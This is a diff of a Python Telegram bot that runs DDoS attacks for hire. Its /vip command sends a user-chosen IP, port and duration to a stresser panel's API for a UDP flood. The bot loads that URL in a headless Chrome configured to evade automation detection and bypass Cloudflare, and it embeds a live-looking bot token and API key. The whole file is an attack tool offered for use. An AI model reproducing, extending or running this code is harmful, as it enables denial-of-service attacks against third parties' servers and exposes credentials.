@@ -1,43 +1,41 @@
 import telebot
 import time
 import threading
+import os
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.chrome.service import Service
-import os
 
 BOT_TOKEN = "8509862711:AAH6j7n-6T8izYPX6Bt0xH3oSFSk0LZfiJs"
 API_KEY = "ujiYT1DJIAacgnFB"
-OWNER_ID = 7459756974  # Apna Telegram ID daalo
+OWNER_ID = 7459756974
 
-# Authorized users list (only owner can add)
 authorized_users = set()
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Setup Chrome for Heroku
+# Chrome options - Heroku-24 compatible
 chrome_options = Options()
-chrome_options.add_argument('--headless')
+chrome_options.add_argument('--headless=new')
 chrome_options.add_argument('--no-sandbox')
 chrome_options.add_argument('--disable-dev-shm-usage')
 chrome_options.add_argument('--disable-gpu')
-chrome_options.binary_location = os.environ.get('GOOGLE_CHROME_BIN', None)
+chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
 
 driver = None
 
 def init_driver():
     global driver
     if driver is None:
-        service = Service(ChromeDriverManager().install())
+        service = Service()
         driver = webdriver.Chrome(service=service, options=chrome_options)
     return driver
 
 def take_screenshot(url):
     driver = init_driver()
     driver.get(url)
-    time.sleep(10)  # Wait 10 seconds for Cloudflare verification
+    time.sleep(10)
     screenshot_path = f"screenshot_{int(time.time())}.png"
     driver.save_screenshot(screenshot_path)
     return screenshot_path
@@ -45,9 +43,9 @@ def take_screenshot(url):
 @bot.message_handler(commands=['start'])
 def start(message):
     if message.from_user.id == OWNER_ID:
-        bot.reply_to(message, "✅ Bot started! Use:\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>\n/status")
+        bot.reply_to(message, "✅ Bot started!\n\nCommands:\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>\n/status")
     else:
-        bot.reply_to(message, "❌ Unauthorized. Contact owner.")
+        bot.reply_to(message, "❌ Unauthorized. Contact @owner")
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
@@ -92,17 +90,18 @@ def vip_attack(message):
             bot.reply_to(message, "❌ Minimum time is 60 seconds!")
             return
         
-        # Send immediate response
-        bot.reply_to(message, f"⚡ VIP Started!\n\n🎯 Target: {ip}:{port}\n⏱️ Time: {time_val}s\n\n📊 Check /status for updates")
+        bot.reply_to(message, f"⚡ VIP Started!\n\n🎯 Target: {ip}:{port}\n⏱️ Time: {time_val}s")
         
-        # Open in Chrome and take screenshot after 10 seconds
         url = f"https://susstresser.com/panel/api/api.php?key={API_KEY}&host={ip}&port={port}&time={time_val}&method=udp"
         
         def capture_and_send():
-            screenshot_path = take_screenshot(url)
-            with open(screenshot_path, 'rb') as photo:
-                bot.send_photo(OWNER_ID, photo, caption=f"📸 Attack sent by {message.from_user.id}\n🎯 {ip}:{port}\n⏱️ {time_val}s")
-            os.remove(screenshot_path)
+            try:
+                screenshot_path = take_screenshot(url)
+                with open(screenshot_path, 'rb') as photo:
+                    bot.send_photo(OWNER_ID, photo, caption=f"📸 Attack by {message.from_user.id}\n🎯 {ip}:{port}\n⏱️ {time_val}s")
+                os.remove(screenshot_path)
+            except Exception as e:
+                bot.send_message(OWNER_ID, f"❌ Screenshot failed: {str(e)}")
         
         threading.Thread(target=capture_and_send).start()
         
@@ -111,7 +110,7 @@ def vip_attack(message):
 
 @bot.message_handler(commands=['status'])
 def status(message):
-    bot.reply_to(message, "🟢 Bot is running!\n✅ Cloudflare verification via Chrome")
+    bot.reply_to(message, "🟢 Bot is running!\n✅ Chrome ready\n✅ Cloudflare bypass active")
 
 # Flask for Heroku
 from flask import Flask
@@ -122,5 +121,5 @@ def home():
     return "Bot is running!"
 
 if __name__ == "__main__":
-    threading.Thread(target=lambda: bot.infinity_polling()).start()
+    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
